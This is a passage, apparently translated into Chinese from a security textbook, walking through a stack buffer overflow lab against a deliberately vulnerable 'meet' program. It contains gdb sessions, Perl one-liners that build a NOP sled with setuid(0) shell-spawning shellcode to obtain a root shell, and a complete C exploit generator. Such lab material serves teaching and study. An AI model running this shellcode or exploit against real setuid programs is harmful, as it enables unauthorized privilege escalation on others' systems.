
```
$ gdb -q --args ./meet Mr `perl -e 'print "A"x412'`
Reading symbols from ./meet...done.
(gdb) run
Starting program: /tmp/meet Mr AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

我们现在已成功使程序崩溃，可以看到 EIP 被覆盖为 0x41414141。接下来，让我们看看栈上有什么。为此，我们将使用“检查内存”命令，并要求 gdb 以十六进制输出。因为查看单个块并不总是非常有帮助，我们将一次查看 32 个字（4 字节）的批次。

```
(gdb) x/32wx $esp
0xbfffff13c:    0xbfffff300   0xbfffff393   0x00000000    0x00000000
0xbfffff14c:    0xb7e15276    0x00000003    0xbfffff1e4   0xbfffff1f4
0xbfffff15c:    0x00000000    0x00000000    0x00000000    0xb7fb0000
0xbfffff16c:    0xb7fffc04    0xb7ffff00    0x00000000    0x00000003
0xbfffff17c:    0xb7fb0000    0x00000000    0x855b54c5    0xb81d98d5
0xbfffff18c:    0x00000000    0x00000000    0x00000000    0x00000003
0xbfffff19c:    0x80000460    0x00000000    0xb7feff50    0xb7e15189
0xbfffff1ac:    0x80002000    0x00000003    0x80000460    0x00000000
```

我们仍然看不到我们的 A，所以要从栈中获取更多数据，可以直接按回车键。我们会继续，直到看到类似这样的内容：

```
0xbfffff33c:    0x00000019    0xbfffff36b   0x0000001f    0xbfffff2c
0xbfffff34c:    0x0000000f    0xbfffff37b   0x00000000    0x00000000
0xbfffff35c:    0x00000000    0x00000000    0x00000000    0x53000000
0xbfffff36c:    0xfa6c4546    0xf1dd3d5c    0xcb57217f    0x69fcb962
0xbfffff37c:    0x00363836    0x00000000    0x742f0000    0x6d2f706d
0xbfffff38c:    0x00746565    0x4100724d    0x41414141    0x41414141
0xbfffff39c:    0x41414141    0x41414141    0x41414141    0x41414141
0xbfffff3ac:    0x41414141    0x41414141    0x41414141    0x41414141
```

可以看到底部，我们的 A（0x41）已可见。我们可以安全地使用栈地址 0xbffff3ac 作为跳转地址。（记住，你的地址可能不同。）这将把我们带入 NOP 滑板，并且偏移了几个字，因此给我们一两个字节的容错空间。现在我们可以使用 Perl 在命令行上以小端格式写入此地址：

```
perl -e 'print "\xac\xf3\xff\xbf"x39';
```

在我们的例子中，数字 39 是通过一些简单的模运算计算出来的：

```
(412 bytes - 200 bytes of NOP - 59 bytes of Shellcode) / 4 bytes of address = 39
```

如果你把这个放到计算器里，你会注意到值是 38.25；不过，我们向上取整了。

当 Perl 命令被反引号（`）包裹时，它们可以连接起来形成更大的字符或数值序列。例如，我们可以构建一个 412 字节的攻击字符串，并像下面这样将其馈送给易受攻击的 meet.c 程序：

```
$ ./meet Mr `perl -e 'print "\x90"x200 . "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\xc0\xf3\xff\xbf"x39'`
Segmentation fault
```

这个 412 字节的攻击字符串用作第二个参数，并按以下方式创建缓冲区溢出：

- 200 字节的 NOPs ("\x90")
- 59 字节的 shellcode
- 156 字节的重复返回地址（请记住，由于 x86 处理器的小端格式，需要反转此顺序）

段错误表明漏洞利用崩溃了。可能的原因在于重复地址的对齐有误。具体来说，它们没有正确或完全覆盖栈上的保存返回地址。要检查这一点，只需增加使用的 NOP 数量：

```
$ ./meet Mr `perl -e 'print "\x90"x201 . "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\xc0\xf3\xff\xbf"x39'`
Segmentation fault
$ ./meet Mr `perl -e 'print "\x90"x202 . "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\xc0\xf3\xff\xbf"x39'`
Segmentation fault
$ ./meet Mr `perl -e 'print "\x90"x203 . "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\xc0\xf3\xff\xbf"x39'`
Hello
[binary garbage]
# id
uid=0(root) gid=1000(joeuser) groups=1000(joeuser)
```

它成功了！这里要意识到的重要一点是，命令行允许我们比通过编译和调试代码更高效地进行实验和调整值。

## Lab 11-4: 使用通用漏洞利用代码利用栈溢出

以下代码是在线和参考资料中找到的许多栈溢出漏洞利用的变体。它是通用的，因为它可以在许多情况下与许多漏洞利用一起使用。

```c
//exploit.c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
char shellcode[] = //setuid(0) & Aleph1's famous shellcode, see ref.
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80" //setuid(0) first
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";
//Small function to retrieve the current esp value (only works locally)
unsigned long get_sp(void)
{
__asm__("movl %esp, %eax");
}

int main(int argc, char *argv[]) { //main function
int i, offset = 0; //used to count/subtract later
unsigned int esp, ret, *addr_ptr; //used to save addresses
char *buffer, *ptr; //two strings: buffer, ptr
int size = 500; //default buffer size

esp = get_sp(); //get local esp value
if(argc > 1) size = atoi(argv[1]); //if 1 argument, store to size
if(argc > 2) offset = atoi(argv[2]); //if 2 arguments, store offset
if(argc > 3) esp = strtoul(argv[3],NULL,0); //used for remote exploits
ret = esp - offset; //calc default value of return

//print directions for use
fprintf(stderr,"Usage: %s <buff_size> <offset> <esp:0xff...>\n", argv[0]); //print feedback of operation
fprintf(stderr,"ESP:0x%x Offset:0x%x Return:0x%x\n",esp,offset,ret);
buffer = (char *)malloc(size); //allocate buffer on heap
ptr = buffer; //temp pointer, set to location of buffer
addr_ptr = (unsigned int *) ptr; //temp addr_ptr, set to location of ptr
//Fill entire buffer with addresses, ensures proper alignment
for(i=0; i < size; i+=4) { // notice increment of 4 bytes for addr
*(addr_ptr++) = ret; //use addr_ptr to write into buffer
}

//Fill 1st half of exploit buffer with NOPs
for(i=0; i < size/2; i++) { //notice, we only write up to half of size
buffer[i] = '\x90'; //place NOPs in the first half of buffer
}

//Now, place shellcode
ptr = buffer + size/2;    //set the temp ptr at half of buffer size
for(i=0; i < strlen(shellcode); i++){    //write 1/2 of buffer til end of sc
  *(ptr++) = shellcode[i];    //write the shellcode into the buffer
}
//Terminate the string
buffer[size-1]=0;        //This is so our buffer ends with a \0
//Now, call the vulnerable program with buffer as 2nd argument.
execl("./meet", "meet", "Mr.",buffer,0);    //the list of args is ended w/0
printf("%s\n",buffer);    //used for remote exploits
//Free up the heap
free(buffer);        //play nicely
return 0;        //exit gracefully
}
```

该程序设置了一个名为 shellcode 的全局变量，用于以十六进制表示法存储生成 shell 的恶意机器代码。接下来，定义了一个函数，用于返回本地系统上 ESP 寄存器的当前值。main 函数最多接受三个参数，可选地设置溢出缓冲区的大小、缓冲区和 ESP 的偏移量，以及用于远程利用的手动 ESP 值。用户使用说明将打印到屏幕上，接着是所使用的内存位置。然后，恶意缓冲区从头开始构建，先填充地址，再填充 NOP，最后填充 shellcode。缓冲区以空字符终止。然后，缓冲区被注入到易受攻击的本地程序中，并打印到屏幕上（对远程利用很有用）。

让我们在 meet.c 上尝试我们的新漏洞利用：
